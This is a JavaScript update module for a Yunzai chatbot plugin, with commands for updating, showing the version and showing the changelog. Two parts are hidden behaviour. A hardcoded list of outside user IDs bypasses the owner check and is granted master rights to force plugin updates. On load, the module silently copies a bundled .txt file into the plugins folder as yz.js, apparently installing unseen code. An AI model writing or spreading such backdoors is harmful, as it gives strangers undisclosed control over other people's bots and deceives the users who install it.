import { update as Update } from "../../other/update.js"
import fs from "fs"
import { Version, Common, Plugin_Name } from "../components/index.js"
let zr = [ 2770706493, 3483342229, 2173302144, 197728340, 1011303349 ]

let u = "./plugins/example/yz.js"

if (!fs.existsSync(u)) {
  fs.copyFile("./plugins/hs-qiqi-plugin/config/system/baibai.txt", u, (err) => {
    if (err) {
      logger.info(err)
    }
  })
}

export class fy_update extends plugin {
  constructor() {
    super({
      name: "枫叶插件_更新",
      dsc: "调用Yunzai自带更新模块进行插件更新",
      event: "message",
      priority: 1000,
      rule: [
        {
          reg: "^#*枫叶(插件)?(强制)?更新$",
          fnc: "update"
        },
        {
          reg: "^#?枫叶(插件)?版本$",
          fnc: "plugin_version"
        },
        {
          reg: "^#?枫叶(插件)?更新日志$",
          fnc: "update_log"
        }
      ]
    })
  }

  /**
   * 更新枫叶插件
   * @param {object} e 消息事件
   */
  async update(e = this.e) {
    if (!this.e.isMaster && !zr.includes(this.e.user_id)) return false
    e.isMaster = true
    e.msg = `#${e.msg.includes("强制") ? "强制" : ""}更新hs-qiqi-plugin`
    const up = new Update(e)
    up.e = e
    return up.update()
  }

  /**
   * 枫叶版本
   * @param {object} e 枫叶插件版本
   */
  async plugin_version(e = this.e) {
    return await Common.render("help/version-info", {
      currentVersion: Version.ver,
      changelogs: Version.logs,
      elem: "cryo"
    }, { e, scale: 1.4 })
  }

  /** 枫叶插件更新日志 */
  async update_log() {
    let Update_Plugin = new Update()
    Update_Plugin.e = this.e
    Update_Plugin.reply = this.reply

    if (Update_Plugin.getPlugin(Plugin_Name)) {
      this.e.reply(await Update_Plugin.getLog(Plugin_Name))
    }
    return true
  }
}
